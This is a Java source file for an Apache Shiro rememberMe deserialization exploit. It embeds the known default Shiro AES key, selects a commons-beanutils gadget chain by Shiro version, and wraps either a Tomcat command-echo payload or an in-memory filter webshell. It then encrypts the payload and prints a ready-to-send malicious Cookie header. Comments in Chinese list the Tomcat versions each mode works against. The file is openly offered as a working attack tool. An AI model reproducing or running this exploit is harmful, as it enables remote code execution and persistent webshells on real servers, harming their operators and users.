package org.shiroattack;

import org.apache.shiro.codec.Base64;

public class Exploit {
    public static void main(String[] args) throws Exception {
        String key = "kPH+bIxk5D2deZiIxcaaaA==";

        /**
         // TomcatEcho：Tomcat回显马，一次执行一次使用。
         // Tomcat 7.0.0、7.0.10、7.0.109、8.5.54、9.0.10均能够成功利用，6.0.53版本利用失败。

         // DefineClass && FilterMemShell: Tomcat 7.0.10、7.0.109、8.5.54、9.0.10、9.0.70利用成功,
         // 7.0.0及以下版本、10.0.0及以上版本利用失败
         */
        String attackMode = "TomcatEcho"; // TomcatEcho / FilterMemShell

        String mode = "GCM";
        byte[] payload;
        if (mode == "CBC") {
            // Shiro < 1.4.2 commons-beanutils = 1.8.3
            payload = CB183.CBWithoutCC(attackMode);
        } else {
            // Shiro >= 1.4.2 commons-beanutils >= 1.9.2
            payload = CB192.CBWithoutCC(attackMode);
        }

        String ciphertext = AESEncrypt.encrypt(payload, Base64.decode(key), mode);

        System.out.println("Cookie: rememberMe=" + ciphertext);
        if (attackMode == "TomcatEcho") {
            System.out.printf("CMD: ls\n");
        } else {
            System.out.printf("\nclass=");
            System.out.print(Gadgets.toBase64(FilterMemShell.class));
        }
    }

}
